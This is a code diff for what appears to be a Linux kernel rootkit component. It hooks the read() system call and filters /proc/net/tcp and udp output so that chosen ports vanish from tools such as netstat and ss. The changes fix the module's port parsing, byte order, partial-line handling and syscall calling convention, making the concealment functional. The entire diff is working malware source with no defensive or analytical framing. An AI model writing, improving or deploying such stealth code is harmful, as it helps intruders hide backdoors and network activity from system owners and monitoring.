@@ -5,7 +5,8 @@
  */
 #include "core.h"
 
-/* Hidden ports stored as uint16_t in network byte order */
+/* Hidden ports stored in HOST byte order — /proc/net/tcp prints
+ * ports as %04X of the host-order value, so no conversion needed. */
 uint16_t hidden_ports[MAX_HIDDEN_PORTS];
 int hidden_port_count = 0;
 static DEFINE_SPINLOCK(net_hide_lock);
@@ -20,7 +21,7 @@ void net_hide_add_port(uint16_t port) {
     unsigned long flags;
     spin_lock_irqsave(&net_hide_lock, flags);
     if (hidden_port_count < MAX_HIDDEN_PORTS) {
-        hidden_ports[hidden_port_count] = htons(port);
+        hidden_ports[hidden_port_count] = port;
         hidden_port_count++;
         pr_info(VAULT_KERNEL_TAG " hiding port: %d\n", port);
     }
@@ -30,10 +31,9 @@ void net_hide_add_port(uint16_t port) {
 void net_hide_del_port(uint16_t port) {
     unsigned long flags;
     int i;
-    uint16_t net_port = htons(port);
     spin_lock_irqsave(&net_hide_lock, flags);
     for (i = 0; i < hidden_port_count; i++) {
-        if (hidden_ports[i] == net_port) {
+        if (hidden_ports[i] == port) {
             hidden_port_count--;
             memmove(&hidden_ports[i], &hidden_ports[i+1],
                     (hidden_port_count - i) * sizeof(uint16_t));
@@ -44,68 +44,123 @@ void net_hide_del_port(uint16_t port) {
     spin_unlock_irqrestore(&net_hide_lock, flags);
 }
 
-static int is_port_hidden(uint16_t net_port) {
+static int is_port_hidden(uint16_t port) {
     unsigned long flags;
-    int i;
+    int i, hidden = 0;
     spin_lock_irqsave(&net_hide_lock, flags);
     for (i = 0; i < hidden_port_count; i++) {
-        if (hidden_ports[i] == net_port) {
-            spin_unlock_irqrestore(&net_hide_lock, flags);
-            return 1;
+        if (hidden_ports[i] == port) {
+            hidden = 1;
+            break;
         }
     }
     spin_unlock_irqrestore(&net_hide_lock, flags);
+    return hidden;
+}
+
+/*
+ * /proc/net/tcp line format:
+ *   sl  local_address rem_address   st tx_queue rx_queue ...
+ *    0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 ...
+ *
+ * Field 0 is the "sl" index (e.g. "0:").  Fields 1 and 2 are
+ * IP:PORT pairs; the port is printed in HOST byte order as %04X.
+ * The old implementation parsed the first ':' in the line (the
+ * index separator) and kstrtoul'd the IP — it never matched.
+ */
+static int token_has_hidden_port(const char *tok, size_t len) {
+    const char *colon;
+    char tmp[8];
+    size_t plen;
+    unsigned long port;
+
+    colon = strnchr(tok, len, ':');
+    if (!colon)
+        return 0;
+
+    plen = len - (size_t)(colon - tok) - 1;
+    if (plen == 0 || plen >= sizeof(tmp))
+        return 0;
+
+    memcpy(tmp, colon + 1, plen);
+    tmp[plen] = '\0';
+
+    if (kstrtoul(tmp, 16, &port))
+        return 0;
+
+    return is_port_hidden((uint16_t)port);
+}
+
+static int line_has_hidden_port(const char *line) {
+    const char *p = line;
+    int field;
+
+    /* Skip the "sl" index field */
+    while (*p && !isspace(*p)) p++;
+    while (*p && isspace(*p)) p++;
+
+    /* Check local_address and rem_address */
+    for (field = 0; field < 2 && *p; field++) {
+        const char *tok = p;
+        size_t len = 0;
+        int hit;
+
+        while (p[len] && !isspace((unsigned char)p[len]))
+            len++;
+
+        hit = token_has_hidden_port(tok, len);
+
+        p += len;
+        while (*p && isspace((unsigned char)*p))
+            p++;
+
+        if (hit)
+            return 1;
+    }
+
     return 0;
 }
 
 /*
- * Parse /proc/net/tcp line format:
- * sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   ...
- *  0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000   ...
- * The local address:port is hex in network byte order: IP:PORT
- */
-static int line_has_hidden_port(const char *line) {
-    char *colon;
-    unsigned long port_hex;
-    uint16_t port;
-
-    /* Find the port after first ':' (4th field is local_address:port) */
-    colon = strchr(line, ':');
-    if (!colon)
-        return 0;
-
-    if (kstrtoul(colon + 1, 16, &port_hex))
-        return 0;
-
-    port = (uint16_t)port_hex; /* Already in network byte order in the file */
-    return is_port_hidden(port);
-}
-
-/*
- * Filter buffer: remove lines containing hidden ports
+ * Filter buffer: remove complete lines containing hidden ports.
+ * A trailing partial line (no newline yet — the read may have
+ * split a record) is passed through untouched so userland line
+ * assembly never sees a corrupted line.
  */
 static size_t filter_port_lines(char *buf, size_t len) {
-    char *src = buf, *dst = buf;
-    char *line_start = buf;
-    char *buf_end = buf + len;
+    char *scan = buf, *end = buf + len;
+    char *dst = buf;
+    char *last_nl = NULL;
+    size_t tail_len;
+    char *p;
 
-    while (src < buf_end) {
-        if (*src == '\n' || src == buf_end - 1) {
-            size_t line_len = src - line_start + (src < buf_end ? 1 : 0);
-
-            if (line_has_hidden_port(line_start)) {
-                /* Skip this line */
-            } else {
-                if (dst != line_start)
-                    memmove(dst, line_start, line_len);
-                dst += line_len;
-            }
-            line_start = src + 1;
+    for (p = end - 1; p >= buf; p--) {
+        if (*p == '\n') {
+            last_nl = p;
+            break;
         }
-        src++;
+    }
+    if (!last_nl)
+        return len;   /* no complete line yet — nothing to filter */
+
+    while (scan <= last_nl) {
+        char *nl = memchr(scan, '\n', (size_t)(last_nl - scan) + 1);
+        size_t line_len = (size_t)((nl ? nl : last_nl) - scan) + 1;
+
+        if (!line_has_hidden_port(scan)) {
+            if (dst != scan)
+                memmove(dst, scan, line_len);
+            dst += line_len;
+        }
+        scan += line_len;
     }
 
-    return dst - buf;
+    /* Preserve the trailing partial line after the filtered region */
+    tail_len = len - (size_t)((last_nl + 1) - buf);
+    if (tail_len && dst != (last_nl + 1))
+        memmove(dst, last_nl + 1, tail_len);
+
+    return (size_t)(dst - buf) + tail_len;
 }
 
 /*
@@ -125,9 +180,11 @@ static unsigned long get_proc_inode(const char *path) {
 /* ================================================================
  * Hooked read() — intercept reads to /proc/net/* files
  * ================================================================ */
-asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count) {
+asmlinkage long hooked_read(const struct pt_regs *regs) {
+    long (*orig_read)(const struct pt_regs *);
+    unsigned int fd = (unsigned int)regs->di;
+    char __user *buf = (char __user *)regs->si;
     ssize_t ret;
-    long (*orig_read)(unsigned int, char __user *, size_t);
     char *kbuf = NULL;
     unsigned long ino = 0;
     struct fd f;
@@ -146,13 +203,13 @@ asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count) 
     /* Only filter /proc/net/tcp* and /proc/net/udp* */
     if (ino != proc_net_tcp_ino && ino != proc_net_tcp6_ino &&
         ino != proc_net_udp_ino && ino != proc_net_udp6_ino) {
-        return orig_read(fd, buf, count);
+        return orig_read(regs);
     }
 
     if (hidden_port_count == 0)
-        return orig_read(fd, buf, count);
+        return orig_read(regs);
 
-    ret = orig_read(fd, buf, count);
+    ret = orig_read(regs);
     if (ret <= 0)
         return ret;
 
@@ -167,14 +224,14 @@ asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count) 
     kbuf[ret] = '\0';
 
     {
-        size_t new_len = filter_port_lines(kbuf, ret);
+        size_t new_len = filter_port_lines(kbuf, (size_t)ret);
         if (new_len < (size_t)ret) {
             size_t copy_len = new_len;
             if (copy_to_user(buf, kbuf, copy_len)) {
                 kfree(kbuf);
                 return -EFAULT;
             }
-            ret = copy_len;
+            ret = (ssize_t)copy_len;
         }
     }
 
